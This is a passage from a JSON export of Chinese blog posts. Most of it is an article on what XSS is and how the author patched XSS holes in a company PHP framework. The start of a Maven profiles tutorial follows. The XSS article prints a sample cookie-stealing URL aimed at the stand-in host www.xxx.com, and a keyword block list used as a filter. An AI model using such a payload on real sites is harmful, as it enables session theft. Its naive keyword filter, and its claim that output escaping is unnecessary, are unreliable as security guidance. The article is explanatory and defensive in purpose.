class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$post</span>;\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$post</span>[<span class=\"hljs-variable\">$name</span>];\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 获取url请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">query</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$get</span>;\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$get</span>[<span class=\"hljs-variable\">$name</span>];\n    }\n    <span class=\"hljs-comment\">/**\n     * 获取请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">rawparams</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_request</span>;\n        <span class=\"hljs-variable\">$param</span> = <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_request</span>[<span class=\"hljs-variable\">$name</span>];\n        <span class=\"hljs-keyword\">if</span>(is_string(<span class=\"hljs-variable\">$param</span>)){\n            <span class=\"hljs-keyword\">return</span> trim(<span class=\"hljs-variable\">$param</span>);\n        }\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$param</span>;\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 获取表单请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">rawform</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_post</span>;\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_post</span>[<span class=\"hljs-variable\">$name</span>];\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 获取url请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">rawquery</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_get</span>;\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_get</span>[<span class=\"hljs-variable\">$name</span>];\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 获取页面全地址\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFullUrl</span><span class=\"hljs-params\">()</span>\n    {</span>\n        <span class=\"hljs-variable\">$sys_protocal</span> = <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'SERVER_PORT'</span>]) &amp;&amp; <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'SERVER_PORT'</span>] == <span class=\"hljs-string\">'443'</span> ? <span class=\"hljs-string\">'https://'</span> : <span class=\"hljs-string\">'http://'</span>;\n        <span class=\"hljs-variable\">$php_self</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'PHP_SELF'</span>] ? <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'PHP_SELF'</span>] : <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'SCRIPT_NAME'</span>];\n        <span class=\"hljs-variable\">$path_info</span> = <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'PATH_INFO'</span>]) ? <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'PATH_INFO'</span>] : <span class=\"hljs-string\">''</span>;\n        <span class=\"hljs-variable\">$relate_url</span> = <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_URI'</span>]) ? <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_URI'</span>] : <span class=\"hljs-variable\">$php_self</span> . (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'QUERY_STRING'</span>]) ? <span class=\"hljs-string\">'?'</span> . <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'QUERY_STRING'</span>] : <span class=\"hljs-variable\">$path_info</span>);\n        <span class=\"hljs-keyword\">return</span> urlencode(<span class=\"hljs-variable\">$sys_protocal</span> . (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'HTTP_HOST'</span>]) ? <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'HTTP_HOST'</span>] : <span class=\"hljs-string\">''</span>) . <span class=\"hljs-variable\">$relate_url</span>);\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 加载\n     */</span>\n    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">oncreate</span><span class=\"hljs-params\">()</span>\n    {</span>\n        <span class=\"hljs-comment\">//对请求参数进行处理</span>\n        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$_GET</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)\n        {\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$get</span>[<span class=\"hljs-variable\">$key</span>] =  StringUtil::string_remove_xss(<span class=\"hljs-variable\">$value</span>);\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_get</span>[<span class=\"hljs-variable\">$key</span>] = <span class=\"hljs-variable\">$value</span>;\n        }\n        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$_POST</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)\n        {\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$post</span>[<span class=\"hljs-variable\">$key</span>] =  StringUtil::string_remove_xss(<span class=\"hljs-variable\">$value</span>);\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_post</span>[<span class=\"hljs-variable\">$key</span>] = <span class=\"hljs-variable\">$value</span>;\n        }\n        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$_REQUEST</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)\n        {\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$request</span>[<span class=\"hljs-variable\">$key</span>] =  StringUtil::string_remove_xss(<span class=\"hljs-variable\">$value</span>);\n            <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$raw_request</span>[<span class=\"hljs-variable\">$key</span>] = <span class=\"hljs-variable\">$value</span>;\n        }\n\n        <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$client_ip</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REMOTE_ADDR'</span>];\n        <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$referer</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'HTTP_REFERER'</span>];\n        <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$url</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_URI'</span>];\n    }\n}\nRequest::create();</code></pre>\n\n<p>通过分析代码，我们可以看到Request在创建的时候会执行它的构造函数onCreate，那么每一次的web请求，均会调用onCreate方法，我们在此处可以对参数值进行筛选过滤，在参数中，我们设定了两种参数，他们都存放着web传递的值，这里我们暂时只举get的例子，<code>self::get</code> 、<code>self::$raw_get</code>，get用于存放过滤后的内容，<code>raw_get</code>用于存放未过滤的内容，方便我们实际业务的获取。在<code>StringUtil::string_remove_xss($value)</code>方法里面，我们去实际过滤下xss。</p>\n\n<p>方法内容:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-php hljs \">     <span class=\"hljs-comment\">/**\n     * 移除数组的xss\n     *<span class=\"hljs-phpdoc\"> @param</span> $array\n     *<span class=\"hljs-phpdoc\"> @return</span> mixed\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">array_remove_xss</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$array</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$array</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$item</span>) {\n            <span class=\"hljs-keyword\">if</span> (is_array(<span class=\"hljs-variable\">$item</span>)) {\n                <span class=\"hljs-variable\">$array</span>[<span class=\"hljs-variable\">$key</span>] = <span class=\"hljs-keyword\">self</span>::array_remove_xss(<span class=\"hljs-variable\">$item</span>);\n            } <span class=\"hljs-keyword\">else</span> {\n                <span class=\"hljs-variable\">$array</span>[<span class=\"hljs-variable\">$key</span>] = <span class=\"hljs-keyword\">self</span>::string_remove_xss(<span class=\"hljs-variable\">$item</span>);\n            }\n        }\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$array</span>;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">string_remove_xss</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$html</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (is_array(<span class=\"hljs-variable\">$html</span>)) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::array_remove_xss(<span class=\"hljs-variable\">$html</span>);\n        } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (!is_string(<span class=\"hljs-variable\">$html</span>)) {<span class=\"hljs-comment\">//如果不是字符串不过滤</span>\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$html</span>;\n        }\n        <span class=\"hljs-variable\">$ra</span> = <span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/'</span>, <span class=\"hljs-string\">'/script/'</span>, <span class=\"hljs-string\">'/javascript/'</span>, <span class=\"hljs-string\">'/vbscript/'</span>, <span class=\"hljs-string\">'/expression/'</span>, <span class=\"hljs-string\">'/applet/'</span>, <span class=\"hljs-string\">'/meta/'</span>, <span class=\"hljs-string\">'/xml/'</span>, <span class=\"hljs-string\">'/blink/'</span>, <span class=\"hljs-string\">'/link/'</span>, <span class=\"hljs-string\">'/style/'</span>, <span class=\"hljs-string\">'/embed/'</span>, <span class=\"hljs-string\">'/object/'</span>, <span class=\"hljs-string\">'/frame/'</span>, <span class=\"hljs-string\">'/layer/'</span>, <span class=\"hljs-string\">'/title/'</span>, <span class=\"hljs-string\">'/bgsound/'</span>, <span class=\"hljs-string\">'/base/'</span>, <span class=\"hljs-string\">'/onload/'</span>, <span class=\"hljs-string\">'/onunload/'</span>, <span class=\"hljs-string\">'/onchange/'</span>, <span class=\"hljs-string\">'/onsubmit/'</span>, <span class=\"hljs-string\">'/onreset/'</span>, <span class=\"hljs-string\">'/onselect/'</span>, <span class=\"hljs-string\">'/onblur/'</span>, <span class=\"hljs-string\">'/onfocus/'</span>, <span class=\"hljs-string\">'/onabort/'</span>, <span class=\"hljs-string\">'/onkeydown/'</span>, <span class=\"hljs-string\">'/onkeypress/'</span>, <span class=\"hljs-string\">'/onkeyup/'</span>, <span class=\"hljs-string\">'/onclick/'</span>, <span class=\"hljs-string\">'/ondblclick/'</span>, <span class=\"hljs-string\">'/onmousedown/'</span>, <span class=\"hljs-string\">'/onmousemove/'</span>, <span class=\"hljs-string\">'/onmouseout/'</span>, <span class=\"hljs-string\">'/onmouseover/'</span>, <span class=\"hljs-string\">'/onmouseup/'</span>, <span class=\"hljs-string\">'/onunload/'</span>);\n        <span class=\"hljs-keyword\">if</span> (!get_magic_quotes_gpc())                         <span class=\"hljs-comment\">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span>\n        {\n            <span class=\"hljs-variable\">$html</span> = addslashes(<span class=\"hljs-variable\">$html</span>);                     <span class=\"hljs-comment\">//给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）加上反斜线转义</span>\n        }\n        <span class=\"hljs-variable\">$html</span> = preg_replace(<span class=\"hljs-variable\">$ra</span>, <span class=\"hljs-string\">''</span>, <span class=\"hljs-variable\">$html</span>);         <span class=\"hljs-comment\">//删除非打印字符，粗暴式过滤xss可疑字符串</span>\n        <span class=\"hljs-variable\">$html</span> = htmlentities(<span class=\"hljs-variable\">$html</span>); <span class=\"hljs-comment\">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$html</span>;\n    }</code></pre>\n\n<p>在筛选过滤中，我们首先对类型进行判断，如果是数组需要进行循环读取属性再调用<code>string_remove_xss</code>方法，</p>\n\n<p>后面几步均有注释说明。</p>\n\n<p>在实际业务使用中，我们只需要使用<code>Request::params()</code>方法获取web网页传递<strong>过滤后</strong>的值，使用<code>Request::rawparams()</code>方法获取web网页传递<strong>未</strong>过滤的值。至此，xss漏洞的<strong>输入点</strong>防护解决完毕。</p>\n\n\n\n<h4 id=\"最后\"><strong>最后</strong></h4>\n\n<p>​   还有一种前端输出数据到网页的过滤模式\u0005我们并没有写相关的处理，原因在于我们只需在输入处严格 控制即可，在输出的时候由于网站的安全策略，其他人点击链接是无法直接使用系统。</p>\n\n<p>在现代基于<code>MVVM</code>框架的的<code>SPA</code>（单页应用）不需要刷新url来控制view，这样可以大大防止xss隐患，例如vue.js react.js在设计的时候设计者已经考虑了xss对html插值的攻击，我们使用者只需要熟练正确地使用他们，大部分情况下可以避免xss攻击。</p>",
			"markdowncontent":"近期公司项目正好被检查出xss漏洞，一直以来其实都知道xss漏洞，不过并没有实际去写过，正好这两天处理了xss漏洞，下面来说一说xss漏洞相关的知识，以及我在项目中如何去解决xss漏洞。\n\n引言: \n\n> 由于web前端的高速发展，现在的web应用都会使用大量的动态内容和动态交互来提高用户的使用体验，那么，动态内容会根据用户的环境来输出相应的内容。在这个内容上，就会受到“跨站脚本攻击”(Cross Site Scripting，缩写为XSS)的威胁。\n\n## xss是什么\n\nxss是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供其他用户使用的页面中，不同于大部分攻击，xss涉及到三方，攻击者、客户端与web应用，xss攻击目标是为了盗取存在客户端的cookie或其它网站用户识别客户端身份的敏感信息，一单获取到合法用户信息，攻击者甚至可以假冒合法用户和网站进行交互。\n\nxss分类：\n\n * 存储型xss，主要让用户输入数据，其他用户浏览查看的地方，例如留言，评论、博客、日志等表单。\n * 反射型xss，主要将脚本代码加入url地址参数，参数再程序后直接输入，用户点击类似链接可能受到攻击\n\nxss目前的主要手段和目的如下：\n\n- 盗用cookie，获取敏感信息。\n- 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。\n- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n- 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果\n\n## xss原理\n\nWeb应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。\n\n接下来以反射性XSS举例说明XSS的过程：现在有一个网站，根据参数输出用户的名称，例如访问url：`http://127.0.0.1/?name=astaxie`，就会在浏览器输出如下信息：\n\n```\nhello astaxie\n```\n\n如果我们传递这样的url：`http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;`,这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，如下这样的url：`http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;`，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。你也许会说，这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的工具来检查是否能盗取那个用户的账户。更多xss分析可看《[新浪微博XSS事件分析](http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html)》\n\n\n\n## 广告彩铃平台的xss漏洞\n\n在我们的admin系统中，由于使用的spring.php框架过于陈旧，没有使用xss过滤，所以在系统多处均有xss漏洞，而在dsp系统中，spring.php框架提供了xss过滤功能，但是在使用中发现由于场景的需要，有些页面可能需要传递json，不能使用xss过滤，需要将其转换为php数组再将其属性进行xss过滤，但是这部分工作由于开发人员的疏忽，导致xss漏洞的存在，通过绿盟的扫描，我们及时对这种漏洞进行修复。\n\n### 1.1 修复思路\n\n根据xss的分类，我们实际可以知晓我们应当在用户输入至后台和前端网站输出内容两处做防护即可，那么在广告平台中，我们在用户输入出进行防护。ok，进入防护主题：\n\n​\t首先我们需要一个在统一拦截器里面对参数进行xss过滤，在`spring.php` （公司自研发的php框架）框架中使用Request来统一获取由前端进行的web请求传递的参数值，通过对参数值的解析过滤，达到xss的效果，但是我们实际业务在获取参数的时候可能需要不过滤的内容（例如传递`json`），那么这个时候，我们需要设计两种方案，实现拿到**安全的参数**或不过滤的参数。\n\n### 1.2 修复开始\n\n```php\nclass Request extends SingletonBase\n{\n    /**\n     * 包含所有get请求字段的数组\n     */\n    private static $get = Array();\n    private static $raw_get = Array();\n\n    /**\n     * 包含所有post请求字段的数组\n     */\n    private static $post = Array();\n    private static $raw_post = Array();\n\n    /**\n     * 包含所有请求字段的数组\n     */\n    private static $request = Array();\n    private static $raw_request = Array();\n\n    /**\n     * 客户端访问的ip地址\n     */\n    public static $client_ip = '';\n\n    /**\n     * 上一次访问地址\n     */\n    public static $referer = '';\n\n    /**\n     * 当前访问地址\n     */\n    public static $url = '';\n\n    /**\n     * 获取请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function params($name = '')\n    {\n        if ($name == '')\n            return self::$request;\n        $param = self::$request[$name];\n        if(is_string($param)){\n            return trim($param);\n        }\n        return $param;\n    }\n\n    /**\n     * 获取表单请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function form($name = '')\n    {\n        if ($name == '')\n            return self::$post;\n        return self::$post[$name];\n    }\n\n    /**\n     * 获取url请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function query($name = '')\n    {\n        if ($name == '')\n            return self::$get;\n        return self::$get[$name];\n    }\n    /**\n     * 获取请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function rawparams($name = '')\n    {\n        if ($name == '')\n            return self::$raw_request;\n        $param = self::$raw_request[$name];\n        if(is_string($param)){\n            return trim($param);\n        }\n        return $param;\n    }\n\n    /**\n     * 获取表单请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function rawform($name = '')\n    {\n        if ($name == '')\n            return self::$raw_post;\n        return self::$raw_post[$name];\n    }\n\n    /**\n     * 获取url请求参数\n     * @param string $name 请求参数名称\n     */\n    public static function rawquery($name = '')\n    {\n        if ($name == '')\n            return self::$raw_get;\n        return self::$raw_get[$name];\n    }\n\n    /**\n     * 获取页面全地址\n     */\n    public static function getFullUrl()\n    {\n        $sys_protocal = isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://';\n        $php_self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];\n        $path_info = isset($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : '';\n        $relate_url = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : $php_self . (isset($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : $path_info);\n        return urlencode($sys_protocal . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . $relate_url);\n    }\n\n    /**\n     * 加载\n     */\n    protected static function oncreate()\n    {\n        //对请求参数进行处理\n        foreach ($_GET as $key => $value)\n        {\n            self::$get[$key] =  StringUtil::string_remove_xss($value);\n            self::$raw_get[$key] = $value;\n        }\n        foreach ($_POST as $key => $value)\n        {\n            self::$post[$key] =  StringUtil::string_remove_xss($value);\n            self::$raw_post[$key] = $value;\n        }\n        foreach ($_REQUEST as $key => $value)\n        {\n            self::$request[$key] =  StringUtil::string_remove_xss($value);\n            self::$raw_request[$key] = $value;\n        }\n\n        self::$client_ip = $_SERVER['REMOTE_ADDR'];\n        self::$referer = $_SERVER['HTTP_REFERER'];\n        self::$url = $_SERVER['REQUEST_URI'];\n    }\n}\nRequest::create();\n```\n\n通过分析代码，我们可以看到Request在创建的时候会执行它的构造函数onCreate，那么每一次的web请求，均会调用onCreate方法，我们在此处可以对参数值进行筛选过滤，在参数中，我们设定了两种参数，他们都存放着web传递的值，这里我们暂时只举get的例子，`self::get` 、`self::$raw_get`，get用于存放过滤后的内容，`raw_get`用于存放未过滤的内容，方便我们实际业务的获取。在`StringUtil::string_remove_xss($value)`方法里面，我们去实际过滤下xss。\n\n方法内容:\n\n```php\n     /**\n     * 移除数组的xss\n     * @param $array\n     * @return mixed\n     */\n    public static function array_remove_xss($array)\n    {\n        foreach ($array as $key => $item) {\n            if (is_array($item)) {\n                $array[$key] = self::array_remove_xss($item);\n            } else {\n                $array[$key] = self::string_remove_xss($item);\n            }\n        }\n        return $array;\n    }\n\n\tpublic static function string_remove_xss($html)\n    {\n        if (is_array($html)) {\n            return self::array_remove_xss($html);\n        } else if (!is_string($html)) {//如果不是字符串不过滤\n            return $html;\n        }\n        $ra = Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '/script/', '/javascript/', '/vbscript/', '/expression/', '/applet/', '/meta/', '/xml/', '/blink/', '/link/', '/style/', '/embed/', '/object/', '/frame/', '/layer/', '/title/', '/bgsound/', '/base/', '/onload/', '/onunload/', '/onchange/', '/onsubmit/', '/onreset/', '/onselect/', '/onblur/', '/onfocus/', '/onabort/', '/onkeydown/', '/onkeypress/', '/onkeyup/', '/onclick/', '/ondblclick/', '/onmousedown/', '/onmousemove/', '/onmouseout/', '/onmouseover/', '/onmouseup/', '/onunload/');\n        if (!get_magic_quotes_gpc())                         //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。\n        {\n            $html = addslashes($html);                     //给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）加上反斜线转义\n        }\n        $html = preg_replace($ra, '', $html);         //删除非打印字符，粗暴式过滤xss可疑字符串\n        $html = htmlentities($html); //去除 HTML 和 PHP 标记并转换为 HTML 实体\n        return $html;\n    }\n```\n\n在筛选过滤中，我们首先对类型进行判断，如果是数组需要进行循环读取属性再调用`string_remove_xss`方法，\n\n后面几步均有注释说明。\n\n在实际业务使用中，我们只需要使用`Request::params()`方法获取web网页传递**过滤后**的值，使用`Request::rawparams()`方法获取web网页传递**未**过滤的值。至此，xss漏洞的**输入点**防护解决完毕。\n\n#### **最后**\n\n​\t还有一种前端输出数据到网页的过滤模式\u0005我们并没有写相关的处理，原因在于我们只需在输入处严格 控制即可，在输出的时候由于网站的安全策略，其他人点击链接是无法直接使用系统。\n\n在现代基于`MVVM`框架的的`SPA`（单页应用）不需要刷新url来控制view，这样可以大大防止xss隐患，例如vue.js react.js在设计的时候设计者已经考虑了xss对html插值的攻击，我们使用者只需要熟练正确地使用他们，大部分情况下可以避免xss攻击。",
			"tags":"安全漏洞,web前端,xss漏洞",
			"id":"78617749",
			"categories":"web安全",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年02月02日 16:40:44",
			"articleedittype":1,
			"private":0,
			"channel":"31",
			"description":"在工作中，我们经常遇到多环境需要不同的配置文件，例如不同环境下连接的数据库不一致。 \n在spring boot项目中可以较为方便的集成，那么在传统的spring web项目中应该如何解决这个问题呢，下面我们尝试使用maven的filter进行处理不同环境的变量值。\n\n\n\n配置pom文件\n\n\n为pom文件添加profile的配置\n\n\n\n\n profiles>\n    profile>\n      i",
			"title":"Maven使用多环境配置",
			"type":"original",
			"content":"<p>在工作中，我们经常遇到多环境需要不同的配置文件，例如不同环境下连接的数据库不一致。 <br>\n在<code>spring boot</code>项目中可以较为方便的集成，那么在传统的<code>spring web</code>项目中应该如何解决这个问题呢，下面我们尝试使用maven的filter进行处理不同环境的变量值。</p>\n\n\n\n<h3 id=\"配置pom文件\">配置pom文件</h3>\n\n<ul>\n<li>为pom文件添加profile的配置</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">profiles</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">profile</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">id</span>&gt;</span>local<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">id</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">activation</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">activeByDefault</span>&gt;</span>true<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">activeByDefault</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">activation</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">properties</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">env</span>&gt;</span>local<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">env</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">profile</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">profile</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">id</span>&gt;</span>development<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">id</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">properties</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">env</span>&gt;</span>development<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">env</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">profile</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">profile</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">id</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">id</span>&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span 